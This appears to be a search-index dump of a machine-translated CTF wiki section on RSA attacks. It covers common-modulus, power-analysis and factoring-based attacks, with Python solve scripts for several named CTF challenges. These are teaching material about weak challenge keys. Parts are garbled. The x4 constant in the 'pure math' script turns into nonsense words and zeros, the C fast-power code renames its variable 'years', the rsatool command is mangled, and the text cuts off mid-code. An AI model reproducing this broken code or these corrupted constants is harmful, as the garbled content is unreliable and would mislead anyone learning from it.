0x68d5702b70d18238f9d4a3ac355b2a8934328250efd4efda39a4d750d80818e6fe228ba3af471b27cc529a4b0bef70a2598b80dd251b15952e6a6849d366633ed7bb716ed63c6febd4cd0621b0c4ebfe5235de03d4ee016448de1afbbe61144845b580eed8be8127a8d92b37f9ef670b3cdd5af613c76f58ca1a9f6f03f1bc11addba30b61bb191efe0015e971b8f78375faa257a60b355050f6435d94b49eab07075f40cb20bb8723d02f5998d5538e8dafc80cc58643c91f6c0868a7a7bf3bf6a9b4b6e79e0a80e89d430f0c049e1db4883c50db066a709b89d74038c34764aac286c36907b392bc299ab8288f9d7e372868954a92cdbf634678f7294096c7\n\nplain = gmpy2.powmod(cipher, d, n1)\n\nplain = hex(plain)[2:]\n\nif len (plain)% 2! = 0:\n    plain = '0' + plain\n\nprint plain.decode('hex')\n</code></pre> <p>Finally decrypted as follows</p> <pre><code>\u279c  scaf-rsa2 git:(master) \u2717 python exp.py       \nsH1R3_PRlME_1N_rsA_iS_4ulnEra5le\n</code></pre> <p>Unzip the package.</p>"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#common-modulus-attack","title":"Common Modulus Attack","text":""},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#attack-prerequisite_2","title":"Attack Prerequisite","text":"<ol> <li>Same modulus N is used multiple times to encrypt the same plaintext m (only e is different for each encryption).</li> <li>e1 and e2 are coprime.</li> </ol>"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#theory","title":"Theory","text":"<p>Suppose the public exponents of two users are e_1 and e_2, where e_1 and e_2 are coprime. If the plaintext m, then the ciphertext is:</p>  c_1 = m^{e_1}\\bmod N \\\\ c_2 = m^{e_2}\\bmod N  <p>Attack could recover the plaintext if he/she obtained c_1 and c_2. Compute the two coefficients r and s of re_1+se_2=1\\bmod n using extended Euclidean Algorithm, we have:</p>  \\begin{align*} c_{1}^{r}c_{2}^{s} &amp;\\equiv m^{re_1}m^{se_2}\\bmod n\\\\ &amp;\\equiv m^{(re_1+se_2)} \\bmod n\\\\ &amp;\\equiv m\\bmod n \\end{align*}"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#jarvis-oj-crypto-very-hard-rsa","title":"Jarvis OJ Crypto - very hard RSA","text":"<p>Check out the given source code:</p> <pre><code>#!/usr/bin/env python\n\nimport random\n\nN = 0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929L\n\ndef pad_even(x):\n    return ('', '0')[len(x)%2] + x\n\ne1 = 17\ne2 = 65537\n\n\nfi = open('flag.txt','rb')\nfo1 = open('flag.enc1','wb')\nfo2 = open('flag.enc2','wb')\n\n\ndata = fi.read()\nfi.close()\n\nwhile (len(data)&lt;512-11):\n    data  =  chr(random.randint(0,255))+data\n\ndata_num = int(data.encode('hex'),16)\n\nencrypt1 = pow(data_num,e1,N)\nencrypt2 = pow(data_num,e2,N)\n\n\nfo1.write(pad_even(format(encrypt1,'x')).decode('hex'))\nfo2.write(pad_even(format(encrypt2,'x')).decode('hex'))\n\nfo1.close()\nfo2.close()\n</code></pre> <p>Take a look at this part:</p> <pre><code>encrypt1 = pow(data_num,e1,N)\nencrypt2 = pow(data_num,e2,N)\n</code></pre> <p>We can see that the same modulus N is used twice, and e1 and e2 are coprime. Proceed with common modulus attack:</p> <pre><code>#!/usr/bin/env python3\nfrom Crypto.Util.number import long_to_bytes, bytes_to_long\nfrom sympy import gcdex\nfrom sys import exit\n\n#--------data--------#\n\nN = 0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929\ne1 = 17\ne2 = 65537\n\nwith open(\"flag.enc1\",\"rb\") as f1, open(\"flag.enc2\", \"rb\") as f2:\n    c1 = bytes_to_long(f1.read())\n    c2 = bytes_to_long(f2.read())\n\n#--------common modulus--------#\n\nr, s, gcd = gcdex(e1, e2)\nr = int(r)\ns = int(s)\n\n# test if e1 and e2 are coprime\nif gcd != 1:\n    print(\"e1 and e2 must be coprime\")\n    exit()\n\nm = (pow(c1, r, N) * pow(c2, s, N)) % N\nflag = long_to_bytes(m)\n\nprint(flag)\n</code></pre> <p>Run the script and grab your flag.</p>"},{"location":"crypto/asymmetric/rsa/rsa_pkcs_attack/","title":"Bleichenbacher's attack","text":"<ul> <li>RSA signature can be forged in the PKCS 1.5 standard</li> </ul> <p>Warning</p> <p>To be added.</p> <ul> <li>http://ddaa.tw/gctf_crypto_201_rsa_ctf_challenge.html</li> </ul>"},{"location":"crypto/asymmetric/rsa/rsa_side_channel/","title":"RSA Side Channel Attack","text":"<p>An energy analysis attack (side channel attack) is a password attack method that can obtain secret information from a cryptographic device. Instead of His attack method is different: this attack uses the energy consumption characteristics of the cryptographic device, not the mathematical characteristics of the cryptographic algorithm. An energy analysis attack is a non-intrusive attack that allows an attacker to easily purchase the equipment needed to implement an attack: this type of attack poses a serious threat to the security of cryptographic devices such as smart cards.</p> <p>Energy analysis attacks are a very important part of the security arena, and we will only discuss them briefly here.</p> <p>Energy analysis attacks are divided into: - Simple Energy Analysis Attack (SPA), which allows visual analysis of energy traces, which can be viewed with the naked eye. - Differential Energy Analysis Attack (DPA), based on correlation coefficients between energy traces.</p>"},{"location":"crypto/asymmetric/rsa/rsa_side_channel/#attack-conditions","title":"Attack conditions","text":"<p>The attacker can obtain side channel information related to encryption and decryption, such as energy consumption, computing time, electromagnetic radiation, and the like.</p>"},{"location":"crypto/asymmetric/rsa/rsa_side_channel/#example","title":"example","text":"<p>Here we take the Hack in the card I of HITB 2017 as an example.</p> <p>The topic gives the public key file <code>publickey.pem</code>, ciphertext, the circuit diagram for measuring the smart card power, and the power consumption consumed by the smart card during the decryption (given [trace] via the online website (http://47.74 .147.53:20015/index.html)).</p> <p></p> <p>Ciphertext: <pre><code>014b05e1a09668c83e13fda8be28d148568a2342aed833e0ad646bd45461da2decf9d538c2d3ab245b272873beb112586bb7b17dc4b30f0c5408d8b03cfbc8388b2bd579fb419a1cac38798da1c3da75dc9a74a90d98c8f986fd8ab8b2dc539768beb339cadc13383c62b5223a50e050cb9c6b759072962c2b2cf21b4421ca73394d9e12cfbc958fc5f6b596da368923121e55a3c6a7b12fdca127ecc0e8470463f6e04f27cd4bb3de30555b6c701f524c8c032fa51d719901e7c75cc72764ac00976ac6427a1f483779f61cee455ed319ee9071abefae4473e7c637760b4b3131f25e5eb9950dd9d37666e129640c82a4b01b8bdc1a78b007f8ec71e7bad48046\n</code></pre></p>"},{"location":"crypto/asymmetric/rsa/rsa_side_channel/#analysis","title":"Analysis","text":"<p>Since the site only gives an energy trace, it can be concluded that this is a Simple channel analysis (SPA) attack. Then we can directly obtain the key d of the RSA decryption process by observing the high and low levels of the energy trace. The theoretical basis for RSA attacks by SPA comes from the fast power remainder algorithm included in RSA.</p> <p>The fast power algorithm is as follows</p> <ol> <li>When b is even, a^b \\bmod c = ({a^2}^{b/2}) \\bmod c.</li> <li>When b is an odd number, a^b \\bmod c = ({a^2}^{b/2} \\times a) \\bmod c.</li> </ol> <p>The corresponding C code is implemented as: <pre><code>int PowerMod(int a, int b, int c)\n\n{\n\nint ans = 1;\n    a = a % c;\n\n    while(b&gt;0) {\n\nIf(b % 2 == 1) // When b is odd, the following instructions will be executed more\nyears = (years * a)% c;\n        b = b/2;\n\n        a = (a * a) % c;\n\n    }\n\nreturn years;\n}\n</code></pre></p> <p>Since the value of the exponent is judged bit by bit during the calculation of the fast power, and different operations are taken, the value of d can be restored from the energy trace (from the above, the directly obtained value is the binary value of d) ** reverse order**).</p> <p>note:</p> <p>&gt; Sometimes modular multiplication may also be multiplied from high to low. Here is the multiplication from the low to the high.</p> <p></p> <p>The script that restores d can be given as follows:</p> <pre><code>f = open('./data.txt')\n\ndata = f.read().split(\",\")\n\nprint('point number:', len(data))\n\n\n\nStart_point = 225 # Point to start analysis\nMid = 50 # sampling point interval\nFence = 228 # high and low level dividing line\n\n\nbin_array = []\n\n\n\nfor point_index in range(start_point, len(data), mid):\n\n    if float(data[point_index]) &gt; fence:\n\n        bin_array.append(1)\n\n    else:\n\n        bin_array.append(0)\n\n\n\nbin_array2 = []\nflag1 = 0\nflag2 = 0\n\nfor x in bin_array:\n\n    if x:\n\n        if flag1:\n\n            flag2 = 1\n\n        else:\n\nflag1 = 1\n    else:\n\n        if flag2:\n\n            bin_array2.append(1)\n\n        else:\n\n            bin_array2.append(0)\n\nflag1 = 0\n        flag2 = 0\n\n\n\n# d_bin = bin_array2 [:: - 1]\nd_bin = bin_array2\nd = \"\".join(str(x) for x in d_bin)[::-1]\n\nprint(d)\n\nd_int = int(d,2)\n\nprint(d_int)\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_side_channel/#references","title":"References","text":"<ol> <li>Mangard, S., Oswald, E., Popp, T., Feng Dengguo, Zhou Yongbin, &amp; Liu Jiye. (2010). Energy Analysis Attack.</li> </ol>"},{"location":"crypto/asymmetric/rsa/rsa_theory/","title":"RSA Introduction","text":"<p>The RSA encryption algorithm is an asymmetric encryption algorithm. RSA is widely used in public key encryption and electronic commerce. The RSA was proposed in 1977 by Ron Rivest, Adi Shamir, and Leonard Adleman. The RSA is composed of the letters of the three names of the three of them.</p> <p>The reliability of the RSA algorithm is determined by the difficulty of maximizing integer factorization. In other words, the more difficult it is to factorize a very large integer, the more reliable the RSA algorithm is. If someone finds a fast factorization algorithm, the reliability of the information encrypted with RSA will definitely drop. But the possibility of finding such an algorithm is very small. Today, only short RSA keys can be broken down in a powerful way. As of 2017, there is no reliable way to attack the RSA algorithm.</p>"},{"location":"crypto/asymmetric/rsa/rsa_theory/#fundamental","title":"Fundamental","text":""},{"location":"crypto/asymmetric/rsa/rsa_theory/#public-key-and-private-key-generation","title":"Public key and private key generation","text":"<ol> <li>Randomly select two different large prime numbers p and q to calculate N = p \\times q</li> <li>According to the Euler function, find \\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1)</li> <li>Select an integer e that is less than \\varphi (N) to make e and \\varphi (N) mutually prime. And ask for e about the inverse of \\varphi (N), named d, with ed\\equiv 1 \\pmod {\\varphi (N)}</li> <li>Destroy records of p and q</li> </ol> <p>At this point, (N,e) is the public key and (N,d) is the private key.</p>"},{"location":"crypto/asymmetric/rsa/rsa_theory/#message-encryption","title":"Message Encryption","text":"<p>First, we need to convert the message into an integer m using an agreed-upon protocol, such than m is less than N and m is coprime to N. If the message is too long, we can divide the message into several segments, which is what we call block encryption, and then encrypt each part with the following formula:</p>  m^{e}\\equiv c\\pmod N"},{"location":"crypto/asymmetric/rsa/rsa_theory/#message-decryption","title":"Message decryption","text":"<p>Use the private key d to decrypt the message.</p>  c^{d}\\equiv m\\pmod N"},{"location":"crypto/asymmetric/rsa/rsa_theory/#verification","title":"Verification","text":"<p>To verify m^{ed} \\equiv m \\bmod N, we use the fact that ed \\equiv 1 \\bmod \\phi(N), then ed=k\\phi(N)+1, it is sufficient to prove that</p>  m^{k\\phi(N)+1} \\equiv m \\bmod N  <p>We will prove it by considering two seperate cases</p> <p>In the first case, gcd(m,N)=1, hence m^{\\phi(N)} \\equiv 1 \\bmod N, so the original claim is true.</p> <p>In the second case, gcd(m,N)\\neq 1, so m must be a multiple of p or q, and since n=m is less than N, we can assume that</p>  m = xp  <p>Where x must be less than q. Since q is a prime number,</p>  m^{\\phi(q)}\\equiv 1 \\bmod q   m^{k\\phi(N)} = m {k(p-1)(q-1)} = (m^{\\phi(q)})^{k(p-1)} \\equiv 1 \\bmod q   m^{k\\phi(N)+1}=m+uqm   m^{k\\phi(N)+1}=m+uqxp=m+uxN  <p>Hence it is proven to be correct.</p>"},{"location":"crypto/asymmetric/rsa/rsa_theory/#basic-tools","title":"Basic Tools","text":""},{"location":"crypto/asymmetric/rsa/rsa_theory/#rsatool","title":"RSAtool","text":"<ul> <li> <p>Installation</p> <pre><code>git clone https://github.com/ius/rsatool.git\ncd rsatool\npython rsatool.py -h\n</code></pre> </li> <li> <p>Generate private key</p> <pre><code>Python rsatool.py f FEM private.pem o p q 1234567 7654321\n</code></pre> </li> </ul>"},{"location":"crypto/asymmetric/rsa/rsa_theory/#rsa-converter","title":"RSA Converter","text":"<ul> <li>Generate a pem file based on a given key pair</li> <li>Obtain p and q from n, e, d</li> </ul>"},{"location":"crypto/asymmetric/rsa/rsa_theory/#openssl","title":"openssl","text":"<ul> <li> <p>View public key file</p> <pre><code>openssl rsa -pubin -in pubkey.pem -text -modulus\n</code></pre> </li> <li> <p>Decryption</p> <pre><code>rsautl -decrypt -inkey private.pem -in flag.enc -out flag\n</code></pre> </li> </ul> <p>For more specific details, please refer to <code>openssl --help</code>.</p>"},{"location":"crypto/asymmetric/rsa/rsa_theory/#decomposition-integer-tool","title":"Decomposition Integer Tool","text":"<ul> <li>Website decomposition, factor.db</li> <li>Command line decomposition, factordb-pycli, borrowing the factordb database.</li> <li>yafu</li> </ul>"},{"location":"crypto/asymmetric/rsa/rsa_theory/#python","title":"python\u5e93","text":""},{"location":"crypto/asymmetric/rsa/rsa_theory/#primefac","title":"primefac","text":"<p>The integer decomposition library contains many algorithms for integer decomposition.</p>"},{"location":"crypto/asymmetric/rsa/rsa_theory/#gmpy","title":"gmpy","text":"<ul> <li><code>gmpy.root(a, b)</code>, returns a tuple <code>(x, y)</code>, where <code>x</code> is the value of <code>a</code> open <code>b</code> power, <code>y</code> is the judgment <code>x</code> whether Boolean variable that is an integer</li> </ul>"},{"location":"crypto/asymmetric/rsa/rsa_theory/#gmpy2","title":"gmpy2","text":"<p>When installing, you may need to install the mfpr and mpc libraries separately.</p> <ul> <li><code>gmpy2.iroot(a, b)</code>, similar to <code>gmpy.root(a,b)</code></li> </ul>"},{"location":"crypto/asymmetric/rsa/rsa_theory/#pycrypto","title":"pycrypto","text":"<ul> <li> <p>Installation</p> <pre><code>sudo pip install pycrypto\n</code></pre> </li> <li> <p>use</p> <pre><code>import gmpy\n\nfrom Crypto.Util.number import *\n\nfrom Crypto.PublicKey import RSA\n\nfrom Crypto.Cipher import PKCS1_v1_5\n\n\n\nmsg = 'crypto here'\n\np = getPrime(128)\n\nq = getPrime(128)\n\nn = p*q\n\ne = getPrime(64)\n\npubkey = RSA.construct((long(n), long(e)))\n\nprivatekey = RSA.construct((long(n), long(e), long(d), long(p), long(q)))\n\nkey = PKCS1_v1_5.new(pubkey)\n\nenc = key.encrypt(msg).encode('base64')\n\nkey = PKCS1_v1_5.new(privatekey)\n\nmsg = key.decrypt(enc.decode('base64'), e)\n</code></pre> </li> </ul>"},{"location":"crypto/asymmetric/rsa/rsa_theory/#jarvis-oj-basic-veryeasyrsa","title":"Jarvis OJ - Basic - veryeasyRSA","text":"<p>p = 3487583947589437589237958723892346254777 q = 8767867843568934765983476584376578389</p> <p>e = 65537</p> <p>Find d =</p> <p>Please submit <code>PCTF{d}</code></p> <p>Using ed\\equiv 1 \\pmod{\\varphi(N)}, we can obtain d from \\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1).</p> <pre><code>import gmpy2\n\np = 3487583947589437589237958723892346254777\n\nq = 8767867843568934765983476584376578389\n\ne = 65537\nphin = (p - 1) * (q - 1)\nprint gmpy2.invert(e, phin)\n</code></pre> <pre><code>\u279c  Jarvis OJ-Basic-veryeasyRSA git:(master) \u2717 python exp.py       \n\n19178568796155560423675975774142829153827883709027717723363077606260717434369\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_theory/#2018-codegate-ctf-rsababy","title":"2018 CodeGate CTF Rsababy","text":"<p>The program is a simple RSA, but the program also generates two strange numbers.</p> <pre><code>e = 65537\nn = p * q\n\npi_n = (p-1) * (q-1)\nd = mulinv (e, pi_n)\nh = (d+p)^(d-p)\n\ng = d*(p-0xdeadbeef)\n</code></pre> <p>So, the problem should come from here, so let's start with it, let's assume that <code>const = 0xdeadbeef</code>. Then</p>  eg = ed * (p-const)  <p>Furthermore, according to RSA</p>  2^{eg}=2^{ed * (p-const)}=2^{p-const} \\pmod n   2^{p-const} * 2^{const-1} = 2^{p-1} \\pmod n  <p>So</p>  2^{p-1} = 2^{eg} * 2^{const-1}+kn  <p>At the same time, according to Fermat's little theorem, we know</p>  2^{p-1} \\equiv 1 \\pmod p  <p>So</p>  p|2^{p-1}-1 | 2^{eg+const-1}-1+kn   p|2^{eg+const-1}-1   p|gcd(2^{eg+const-1}-1,n)  <p>Hence the code is as follows</p> <pre><code>tmp = gmpy2.powmod(2,e*g+const-1,n)-1\n\np = gmpy2.gcd(tmp,n)\n\nq = n/p\n\nPhin = (p-1) * (q-1)\nd = gmpy2.invert (e, phin)\nplain = gmpy2.powmod(data,d,n)\n\nprint hex(plain)[2:].decode('hex')\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_theory/#2018-national-security-week-pure-math","title":"2018 National Security Week pure math","text":"<p>The basic description of the topic is like this</p> <pre><code>1) p ** p % q = 1137973316343089029387365135250835133803975869258714714790597743585251681751361684698632609164883988455302237641489036138661596754239799122081528662395492\n\n2) q ** q % p = 6901383184477756324584651464895743132603115552606852729050186289748558760692261058141015199261946483809004373728135568483701274908717004197776113227815323\n\n3) (p ** q + q ** p) % (p*q) = 16791287391494893024031688699360885996180880807427715700800644759680986120242383930558410147341340225420991368114858791447699399702390358184412301644459406\n\n4) (p+q) ** (p+q) % (p*q) = 63112211860889153729003401381621068190906433969243079543438386686621389392583849748240273643614258173423474299387234175508649197780206757067354426424570586101908571600743792328163163458500138799976944702155779196849585083397395750018148652864158388247163109077215394538930498877175474225571393901460434679279\n\n5) FLAG ** 31337 % (p*q) = 6931243291746179589612148118911670244427928875888377273917973305632621316868302667641610838193899081089153471883271406133321321416064760200919958612671379845738048938060512995550639898688604592620908415248701721672948126507753670027043162669545932921683579001870526727737212722417683610956855529996310258030\n\nNow, what\u2019s the FLAG???\n</code></pre> <p>Our goal is basically to find FLAG, but how can we find it? This question requires us to be more familiar with number theory.</p> <p>From the content of the question, we can assume that p, q are both large prime numbers, so</p> <p>p^{q-1} \\equiv  1\\bmod q</p> <p>Then</p> <p>p^{q} \\equiv p \\bmod pq</p> <p>From 3), we know that</p> <p>p^q+q^p \\equiv p+q \\bmod pq</p> <p>And p+q is obviously smaller than pq, so we know the value of p+q.</p> <p>We let x_1, x_2, x_3, x_4, x_5 take the values of 1) to 5) respectively.</p> <p>From 4), we have</p> <p>(p+q)^{p+q} \\equiv p^{p+q}+q^{p+q} \\bmod pq</p> <p>And because of 1) and 2), then</p> <p>p^pp \\equiv px_1\\bmod pq</p> <p>q^qq \\equiv qx_2 \\bmod pq</p> <p>therefore</p> <p>px_1+qx_2 \\equiv x_4 \\bmod pq</p> <p>From the way x_1 and x_2 are obtained, we know that px_1+qx_2 is also equal to x_4, so we get a system of linear equations in two variables and can solve it directly.</p> <pre><code>import gmpy2\n\nx1 = 1137973316343089029387365135250835133803975869258714714790597743585251681751361684698632609164883988455302237641489036138661596754239799122081528662395492\n\nX2 = 6901383184477756324584651464895743132603115552606852729050186289748558760692261058141015199261946483809004373728135568483701274908717004197776113227815323\np_q = 16791287391494893024031688699360885996180880807427715700800644759680986120242383930558410147341340225420991368114858791447699399702390358184412301644459406\n\nx4 = 63112211860889153729 0034062380936348635813582583974823274634293429254290729072907052006074920060749s729Readingly 97297499258793650s 8392407 3105245 94071857 531058007 518 764 579 54 0 0 0 0 0 0 0 0 0 0 0 0\n\n\nif (x4 - x1 * p_q) % (x2 - x1) == 0:\n\n    print 'True'\n\nq = (x4 - x1 * p_q) / (x2 - x1)\n\nprint q\n\np = p_q - q\n\n\n\nc = 6931243291746179589612148118911670244427928875888377273917973305632621316868302667641610838193899081089153471883271406133321321416064760200919958612671379845738048938060512995550639898688604592620908415248701721672948126507753670027043162669545932921683579001870526727737212722417683610956855529996310258030\n\n\n\nPhin = (p - 1) * (q - 1)\nd = gmpy2.invert (31337, phin)\nflag = gmpy2.powmod(c, d, p * q)\n\nflag = hex(flag)[2:]\n\nprint flag.decode('hex')\n</code></pre> <p>Flag is as follows</p> <pre><code>\u279c 2018-National Security Week first game-puremath git:(master) \u2717 python exp.py\nTrue\n\n7635093784603905632817000902311635311970645531806863592697496927519352405158721310359124595712780726701027634372170535318453656286180828724079479352052417\n\nflag{6a66b8d5-6047-4299-a48e-4c4d1f874d12}\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_theory/#2018-pwnhub-lhy","title":"2018 Pwnhub LHY","text":"<p>First analyze this code</p> <pre><code>assert gmpy.is_prime(y)**2016 + gmpy.is_prime(x + 1)**2017 + (\n\n    (x**2 - 1)**2 % (2 * x * y - 1) + 2\n\n)**2018 == 30097557298197417800049182668952226601954645169633891463401117760245367082644152355564014438095421962150109895432272944128252155287648477680131934943095113263121691874508742328500559321036238322775864636883202538152031804102118831278605474474352011895348919417742923873371980983336517409056008233804190890418285814476821890492630167665485823056526646050928460488168341721716361299816947722947465808004305806687049198633489997459201469227952552870291934919760829984421958853221330987033580524592596407485826446284220272614663464267135596497185086055090126893989371261962903295313304735911034185619611156742146\n</code></pre> <p>Since <code>gmpy.is_prime</code> either returns 1 or returns 0, we can easily try out that y is a prime number, x+1 is also a prime number, and</p> <p>(x^2-1)^2 \\equiv 0 \\bmod(2xy-1)</p> <p>In order for the expression to be divisible, we guess that x=2y.</p> <p>So for the following code</p> <pre><code>p = gmpy.next_prime(x**3 + y**3)\nq = gmpy.next_prime(x**2 * y + y**2 * x)\nn = p * q\nphi = (p - 1) * (q - 1)\nd = gmpy.invert(0x10001, phi)\nenc = pow(bytes_to_long(flag), 0x10001, n)\nprint 'n =', n\nprint 'enc =', enc\n</code></pre> <p>p and q are naturally</p> <p>p=next\\_prime(9y^3)</p> <p>q=next\\_prime(6y^3)</p> <p>According to the interval of prime numbers, we know that p and q are at most a little larger than the numbers in parentheses, and generally would not exceed 1000 here.</p> <p>Then</p> <p>n \\geq 54y^6</p> <p>So we know the upper bound of y, and the lower bound of y is actually not too far from the upper bound, we probably reduce hundreds of thousands. Hence, we use binary search to find p and q, as follows</p> <pre><code>import gmpy2\ntmp = 30097557298197417800049182668952226601954645169633891463401117760245367082644152355564014438095421962150109895432272944128252155287648477680131934943095113263121691874508742328500559321036238322775864636883202538152031804102118831278605474474352011895348919417742923873371980983336517409056008233804190890418285814476821890492630167665485823056526646050928460488168341721716361299816947722947465808004305806687049198633489997459201469227952552870291934919760829984421958853221330987033580524592596407485826446284220272614663464267135596497185086055090126893989371261962903295313304735911034185619611156742146\n\nprint gmpy2.iroot(tmp, 2018)\nprint gmpy2.iroot(tmp - 1, 2018)\n\nprint gmpy2.iroot(tmp - 2, 2018)\n\nn = 260272753019642842691231717156206014402348296256668058656902033827190888150939144319270903947159599144884859205368557385941127216969379550487700198771513118894125094678559478972591331182960004648132846372455712958337042783083099376871113795475285658106058675217077803768944674144803250791799957440111855021945690877200606577646234107957498370758707097662736662439460472126493593605957225541979181422479704018055731221681621886820626215670393536343427267329350730257979042198593215747542270975288047196483958369426727778580292311145109908665004662296440533724591193527886702374790526322791818523938910660223971454070731594803459613066617828657725704376475527288174777197739360634209448477565044519733575375490101670974499385760735451471034271880800081246883157088501597655371430353965493264345172541221268942926210055390568364981514774743693528424196241142665685211916330254113610598390909248626686397970038848966187547231199741\n\ny = 191904757378974300059526915134037747982760255307942501070454569331878491189601823952845623286161325306079772871025816081849039036850918375408172174102720702781463514549851887084613000000L\ny = gmpy2.next_prime(y)\n\nenc = 73933313646416156737449236838459526871566017180178176765840447023088664788672323530940171469589918772272559607026808711216932468486201094786991159096267208480969757088208089800600731106685561375522764783335332964711981392251568543122418192877756299395774738176188452197889668610818741062203831272066261677731889616150485770623945568369493256759711422067551058418926344060504112146971937651406886327429318390247733970549845424064244469193626197360072341969574784310397213033860597822010667926563087858301337091484951760613299203587677078666096526093414014637559237148644939541419075479462431789925219269815364529507771308181435591670281081465439913711912925412078002618729159141400730636976744132429329651487292506365655834202469178066850282850374067239317928012461993443785247524500680257923687511378073703423047348824611101206633407452837948194591695712958510124436821151767823443033286425729473563002691262316964646014201612\n\nend = gmpy2.iroot(n / 54, 6)[0]\nbeg = end - 2000000\n\nmid = 1\nwhile beg &lt; end:\n    mid = (beg + end) / 2\n    if gmpy2.is_prime(mid) != 1:\n        mid = gmpy2.next_prime(mid)\n    p = gmpy2.next_prime(9 * mid**3)\n    q = gmpy2.next_prime(6 * mid**3)\n    n1 = p * q\n    if n1 == n:\n        print p, q\n        phin = (p - 1) * (q - 1)\n        d = gmpy2.invert(0x10001, phin)\n        m = gmpy2.powmod(enc, d, n)\n        print hex(m)[2:].strip('L').decode('hex')\n        print 'ok'\n        exit(0)\n    elif n1 &lt; n:\n        beg = mid\n    else:\n        end = mid\n    print beg, end\n</code></pre>"},{"location":"crypto/attack-summary/attack-mode/","title":"Introduction","text":""},{"location":"crypto/attack-summary/attack-mode/#attack-mode","title":"Attack mode","text":"<p>When we attack a cryptography system, we get more or less information about the system. Depending on the amount of information we receive, the methods we can use may vary. In today's cryptanalysis, we generally assume that the attacker knows the cryptographic algorithm. This assumption is reasonable because there are many secret algorithms in history that are finally known, such as RC4. There are many ways to be known, such as spying, reverse engineering, etc.</p> <p>Here we divide the attack mode into the following categories based on how much information the attacker obtains from the cryptography system.</p> <ul> <li>** ciphertext attack only**: The attacker can only get some encrypted ciphertext.</li> <li>** Known plaintext attack**: The attacker has some plaintext corresponding to the ciphertext.</li> <li>Select plaintext attack: The attacker can choose some plaintext when starting the attack and get the encrypted ciphertext. If an attacker can select a new plaintext based on the acquired information and obtain the corresponding ciphertext in the middle of the attack, it is called an adaptive selective plaintext attack.</li> <li>Select ciphertext attack: The attacker can select some ciphertexts and get the decrypted plaintext before starting the attack. If an attacker can select some new ciphertexts based on the information that has been acquired and obtain the corresponding plaintext, the attacker is called adaptive ciphertext attack.</li> <li>Related key attack: An attacker can obtain encrypted or decrypted ciphertext or plaintext of two or more related keys. But the attacker does not know these keys.</li> </ul>"},{"location":"crypto/attack-summary/attack-mode/#common-attack-methods","title":"Common attack methods","text":"<p>According to different attack modes, there may be different attack methods. Currently, common attack methods mainly include</p> <ul> <li>violent attacks</li> <li>Intercommunication attack</li> <li>Linear analysis</li> <li>Differential analysis</li> <li>Impossible differential analysis</li> <li>Integration analysis</li> <li>Algebraic analysis</li> <li>Related key attack</li> <li>Side channel attack</li> </ul>"},{"location":"crypto/attack-summary/attack-mode/#references","title":"references","text":"<ul> <li>https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90</li> </ul>"},{"location":"crypto/attack-summary/bit-attack/","title":"\u6bd4\u7279\u653b","text":""},{"location":"crypto/attack-summary/bit-attack/#overview","title":"Overview","text":"<p>Simply put, it is to use the relationship between the bits to attack.</p>"},{"location":"crypto/attack-summary/bit-attack/#2018-plaid-ctf-transducipher","title":"2018 Plaid CTF transducipher","text":"<p>The title is as follows</p> <pre><code>#!/usr/bin/env python3.6\n\nimport\n\n\nBLOCK_SIZE = 64\n\n\n\nT = [\n\n    ((2, 1), 1),\n\n    ((5, 0), 0),\n\n    ((3, 4), 0),\n\n    ((1, 5), 1),\n\n    ((0, 3), 1),\n\n    ((4, 2), 0),\n\n]\n\n\n\n\n\ndef block2bin(b, length=BLOCK_SIZE):\n\n    return list(map(int, bin(b)[2:].rjust(length, '0')))\n\n\n\n\n\ndef bin2block(b):\n\n    return int(\"\".join(map(str, b)), 